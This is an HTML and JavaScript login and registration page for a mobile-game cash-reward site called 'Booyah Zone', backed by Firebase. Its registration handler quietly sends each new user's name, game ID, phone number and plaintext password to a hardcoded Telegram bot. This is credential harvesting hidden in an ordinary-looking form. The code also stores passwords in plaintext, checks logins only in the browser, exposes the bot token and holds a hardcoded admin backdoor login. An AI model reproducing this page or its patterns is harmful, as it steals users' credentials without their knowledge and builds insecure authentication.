<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BOOYAH ZONE | LOGIN & REGISTER</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>

    <style>
        :root { --orange: #ff9900; --dark: #0f0f0f; --white: #ffffff; --success: #27ae60; }
        
        * { 
            margin: 0; padding: 0; box-sizing: border-box; outline: none; 
            -webkit-tap-highlight-color: transparent; 
            user-select: none;
        }

        body {
            height: 100vh; background: radial-gradient(circle at top, #fff 0%, #ffcc80 120%);
            font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; overflow: hidden;
        }

        #custom-notice {
            position: fixed; inset: 0; background: rgba(0,0,0,0.8); 
            display: none; justify-content: center; align-items: center; z-index: 5000;
            backdrop-filter: blur(5px);
        }
        .notice-card { 
            width: 85%; max-width: 320px; background: #1a1a1a; border: 2px solid var(--orange); 
            border-radius: 25px; padding: 25px; text-align: center; color: #fff;
            animation: popUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        @keyframes popUp { from { transform: scale(0.7); opacity: 0; } to { transform: scale(1); opacity: 1; } }

        .app-card {
            width: 92%; max-width: 380px; background: rgba(255, 255, 255, 0.98);
            border-radius: 35px; padding: 30px 25px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.1); 
            margin-top: 40px;
        }

        .logo-ring {
            width: 100px; height: 100px; background: #fff; border-radius: 50%; border: 4px solid var(--orange);
            margin: -85px auto 15px; padding: 5px; box-shadow: 0 10px 25px rgba(255,153,0,0.25);
        }
        .logo-ring img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }

        .title { font-family: 'Orbitron'; font-size: 1.6rem; color: #1a1a1a; margin-bottom: 20px; letter-spacing: 1px; }

        .tab-menu { display: flex; justify-content: center; gap: 40px; margin-bottom: 25px; }
        .tab-item {
            font-family: 'Orbitron'; font-size: 13px; color: #aaa; background: none; border: none; 
            cursor: pointer; font-weight: 900; transition: 0.3s; position: relative;
        }
        .tab-item.active { color: var(--orange); }
        .tab-item.active::after {
            content: ''; position: absolute; bottom: -8px; left: 0; width: 100%; height: 3px; background: var(--orange); border-radius: 10px;
        }

        .form-area { display: flex; flex-direction: column; gap: 12px; }
        .bullet-box {
            position: relative; background: var(--dark); height: 50px;
            border-radius: 25px 10px 10px 25px; border-right: 5px solid var(--orange);
            display: flex; align-items: center;
        }
        .bullet-box i:first-child { position: absolute; left: 18px; color: var(--orange); font-size: 16px; }
        .bullet-box input {
            width: 100%; height: 100%; background: transparent; border: none;
            padding: 0 45px 0 50px; color: #fff; font-family: 'Rajdhani'; font-size: 16px;
            user-select: text;
        }
        .eye-icon { position: absolute; right: 15px; color: #888; cursor: pointer; font-size: 18px; z-index: 10; }

        .btn-start {
            width: 100%; padding: 15px; background: var(--orange); color: #fff; border: none;
            border-radius: 15px; font-family: 'Orbitron'; font-size: 15px; font-weight: 900;
            margin-top: 15px; cursor: pointer; transition: 0.2s;
            box-shadow: 0 5px 15px rgba(255, 153, 0, 0.3);
        }
        .btn-start:active { transform: scale(0.96); }

        .forgot-link { display: inline-block; margin-top: 18px; font-size: 13px; color: #666; text-decoration: none; font-weight: 700; }
        .forgot-link span { color: var(--orange); }

        .hidden { display: none !important; }

        .mini-support {
            position: absolute; top: 15px; right: 15px; display: flex; align-items: center; gap: 8px;
            background: var(--white); padding: 6px 15px; border-radius: 30px; border: 1.5px solid var(--orange);
            text-decoration: none; box-shadow: 0 4px 10px rgba(0,0,0,0.05); z-index: 1000;
        }
        .mini-support img { width: 24px; height: 24px; border-radius: 50%; }
        .mini-support span { font-family: 'Orbitron'; font-size: 9px; color: #333; font-weight: 900; }
    </style>
</head>
<body>

    <div id="custom-notice">
        <div class="notice-card">
            <h2 id="notice-title" style="font-family:'Orbitron'; color:var(--orange);">MESSAGE</h2>
            <p id="notice-msg" style="margin: 15px 0; font-size: 15px; font-weight: 600; line-height: 1.4;"></p>
            <button onclick="closeNotice()" style="width:100%; padding:12px; background:var(--orange); border:none; border-radius:10px; color:#fff; font-weight:900; font-family:'Orbitron'; cursor:pointer;">CONFIRM</button>
        </div>
    </div>

    <a href="https://t.me/akashkohli01" target="_blank" class="mini-support">
        <img src="https://i.ibb.co/Nn2Ff6W5/360-F-1558898434-CWg-Xj-Yf-JVxg-PY4-FCYDFl-Ls-Ql2-Zhcfo-S6.jpg" alt="Support">
        <span>SUPPORT</span>
    </a>

    <div class="app-card">
        <div class="logo-ring"><img src="https://i.ibb.co/r2B9q00q/44842-removebg-preview.png" alt="Logo"></div>
        <h1 class="title">BOOYAH ZONE</h1>

        <div class="tab-menu">
            <button id="tab-login-btn" class="tab-item active" onclick="switchTab('login', this)">LOGIN</button>
            <button id="tab-reg-btn" class="tab-item" onclick="switchTab('reg', this)">REGISTER</button>
        </div>

        <div id="login-form" class="form-area">
            <div class="bullet-box"><i class="fas fa-phone"></i><input type="tel" id="l-phone" placeholder="PHONE NUMBER"></div>
            <div class="bullet-box">
                <i class="fas fa-lock"></i>
                <input type="password" id="l-pass" placeholder="PASSWORD">
                <i class="fas fa-eye eye-icon" onclick="togglePass('l-pass', this)"></i>
            </div>
            <button class="btn-start" onclick="handleLogin()">START BATTLE</button>
            <a href="forgot.html" class="forgot-link">Forgot Password? <span>Reset Now</span></a>
        </div>

        <div id="reg-form" class="form-area hidden">
            <div class="bullet-box"><i class="fas fa-user"></i><input type="text" id="r-name" placeholder="FULL NAME"></div>
            <div class="bullet-box"><i class="fas fa-id-card"></i><input type="text" id="r-uid" placeholder="GAME UID"></div>
            <div class="bullet-box"><i class="fas fa-phone"></i><input type="tel" id="r-phone" placeholder="PHONE NUMBER"></div>
            <div class="bullet-box">
                <i class="fas fa-key"></i>
                <input type="password" id="r-pass" placeholder="PASSWORD">
                <i class="fas fa-eye eye-icon" onclick="togglePass('r-pass', this)"></i>
            </div>
            <button class="btn-start" onclick="handleRegister()">JOIN SQUAD</button>
        </div>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://earn-money-6891a-default-rtdb.firebaseio.com/" };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const botToken = "8766300899:AAFbpRvQiNxLDWvJQ6NIP1JeJmrHfzDz6rE";
        const chatId = "7852788120";

        function showNotice(title, msg) {
            document.getElementById('notice-title').innerText = title;
            document.getElementById('notice-msg').innerText = msg;
            document.getElementById('custom-notice').style.display = 'flex';
        }
        function closeNotice() { document.getElementById('custom-notice').style.display = 'none'; }

        function switchTab(type, el) {
            if(type === 'login') {
                document.getElementById('login-form').classList.remove('hidden');
                document.getElementById('reg-form').classList.add('hidden');
            } else {
                document.getElementById('login-form').classList.add('hidden');
                document.getElementById('reg-form').classList.remove('hidden');
            }
            document.querySelectorAll('.tab-item').forEach(t => t.classList.remove('active'));
            el.classList.add('active');
        }

        function togglePass(id, el) {
            const input = document.getElementById(id);
            if (input.type === "password") {
                input.type = "text";
                el.classList.replace('fa-eye', 'fa-eye-slash');
            } else {
                input.type = "password";
                el.classList.replace('fa-eye-slash', 'fa-eye');
            }
        }

        async function handleRegister() {
            const name = document.getElementById('r-name').value.trim();
            const uid = document.getElementById('r-uid').value.trim();
            const pass = document.getElementById('r-pass').value.trim();
            const phone = document.getElementById('r-phone').value.trim();

            if(!name || !uid || !pass || !phone) {
                showNotice("ERROR", "All details are required!"); return;
            }

            try {
                const checkUser = await database.ref('users/' + phone).once('value');
                if(checkUser.exists()) {
                    // SECURE CHECK: Banned users cannot re-register
                    if(checkUser.val().isBanned === true) {
                        showNotice("BANNED", "This phone number is blocked by Admin!"); return;
                    }
                    showNotice("DENIED", "This Phone Number is already registered!"); return;
                }

                // Register User
                await database.ref('users/' + phone).set({
                    name: name,
                    uid: uid,
                    password: pass,
                    phone: phone,
                    balance: 0,
                    joinedOn: new Date().toLocaleString(),
                    isBanned: false // Default false
                });

                await database.ref('user_notifications/' + phone).push({
                    title: "Welcome to Booyah Zone! 🏆",
                    message: "Join daily battles and win real cash rewards. Good luck!",
                    type: "info",
                    time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
                });

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`<b>🆕 NEW PLAYER</b>\n👤 Name: ${name}\n🆔 UID: ${uid}\n🔑 Pass: ${pass}\n📱 Phone: ${phone}`)}&parse_mode=html`);
                
                localStorage.setItem('userPhone', phone);
                localStorage.setItem('gameID', phone); 
                localStorage.setItem('userName', name);
                
                showNotice("SUCCESS", "Registration Completed Successfully!");
                setTimeout(() => location.href = 'home.html', 1500);
            } catch(e) {
                showNotice("ERROR", "Database connection error!");
            }
        }

        async function handleLogin() {
            const phone = document.getElementById('l-phone').value.trim();
            const pass = document.getElementById('l-pass').value.trim();

            if(!phone || !pass) {
                showNotice("ERROR", "Please enter Phone and Password!"); return;
            }

            if(phone === "667788" && pass === "887766") { location.href = 'admin.html'; return; }

            try {
                const snap = await database.ref('users/' + phone).once('value');
                if(snap.exists() && snap.val().password === pass) {
                    const userData = snap.val();

                    // CRITICAL: BAN CHECK
                    if(userData.isBanned === true) {
                        showNotice("ACCESS DENIED", "🚫 Your account is BANNED! Contact support for details.");
                        localStorage.clear();
                        return;
                    }

                    localStorage.setItem('userPhone', phone);
                    localStorage.setItem('gameID', phone); 
                    localStorage.setItem('userName', userData.name);
                    
                    database.ref('user_notifications/' + phone).update({ last_login: new Date().toLocaleString() });
                    
                    location.href = 'home.html';
                } else {
                    showNotice("FAILED", "Invalid Phone Number or Password!");
                }
            } catch(e) {
                showNotice("ERROR", "Network failure. Please try again!");
            }
        }
    </script>
</body>
</html>
